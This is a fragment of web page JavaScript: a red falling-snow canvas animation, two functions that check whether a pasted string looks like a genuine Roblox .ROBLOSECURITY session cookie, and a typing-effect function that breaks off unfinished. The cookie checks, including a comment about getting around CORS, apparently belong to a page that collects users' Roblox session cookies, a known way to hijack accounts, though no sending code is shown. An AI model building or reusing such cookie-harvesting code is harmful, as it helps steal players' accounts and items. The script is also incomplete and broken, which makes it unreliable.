<script>
(function(){
  const canvas = document.getElementById("snowCanvas");
  const ctx = canvas.getContext("2d");
  let width = canvas.width = window.innerWidth;
  let height = canvas.height = window.innerHeight;
  let snowflakes = [];
  const number = 100;
  for (let i = 0; i < number; i++){
      snowflakes.push({
          x: Math.random() * width,
          y: Math.random() * height,
          radius: Math.random() * 4 + 1,
          density: Math.random() * number
      });
  }
  let angle = 0;
  function drawSnowflakes(){
      ctx.clearRect(0, 0, width, height);
      ctx.fillStyle = "rgba(255, 0, 0, 0.8)";
      ctx.beginPath();
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          ctx.moveTo(f.x, f.y);
          ctx.arc(f.x, f.y, f.radius, 0, Math.PI * 2, true);
      }
      ctx.fill();
      updateSnowflakes();
  }
  function updateSnowflakes(){
      angle += 0.005;
      for (let i = 0; i < number; i++){
          let f = snowflakes[i];
          f.y += Math.cos(angle + f.density) + 0.5 + f.radius / 4;
          f.x += Math.sin(angle) * 0.5;
          if (f.x > width + 5 || f.x < -5 || f.y > height) {
              snowflakes[i] = { x: Math.random() * width, y: -10, radius: f.radius, density: f.density };
          }
      }
  }
  setInterval(drawSnowflakes, 33);
  window.addEventListener("resize", function(){
    width = canvas.width = window.innerWidth;
    height = canvas.height = window.innerHeight;
  });
})();
</script>

// Function to validate .ROBLOSECURITY cookie format
function isValidRobloxCookie(cookie) {
  const validPrefixes = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
  ];
  return validPrefixes.some(prefix => cookie.startsWith(prefix)) &&
         /^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie) &&
         cookie.length > 50;
}

// Simple cookie validation that bypasses CORS issues
function validateCookieFormat(cookie) {
  // Check if cookie has valid format and length
  const validPrefixes = [
    '_|WARNING:-DO-NOT-SHARE-THIS.--',
    '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.'
  ];
  
  if (!cookie || cookie.length < 100) {
    return { valid: false, error: "Cookie too short" };
  }
  
  if (!validPrefixes.some(prefix => cookie.startsWith(prefix))) {
    return { valid: false, error: "Invalid cookie format - must start with WARNING prefix" };
  }
  
  // Check for valid characters (Roblox cookies contain specific character sets)
  if (!/^[A-Za-z0-9+/=\-_.|:!@#$%^&*(),.?";'\\[\]{}]*$/.test(cookie)) {
    return { valid: false, error: "Invalid characters in cookie" };
  }
  
  // Additional length check - Roblox cookies are typically 800+ characters
  if (cookie.length < 800) {
    return { valid: false, error: "Cookie appears to be incomplete" };
  }
  
  return { valid: true, error: null };
}

function typeEffect() {
  const text = texts[i];
  let index = 0;

  const typing = setInterval(() => {
    if (index <= text.length) {
      typedText.textContent = text.slice(0, index);
      index++;
    } else {
      clearInterval(typing);
      setTimeout(() => {

}
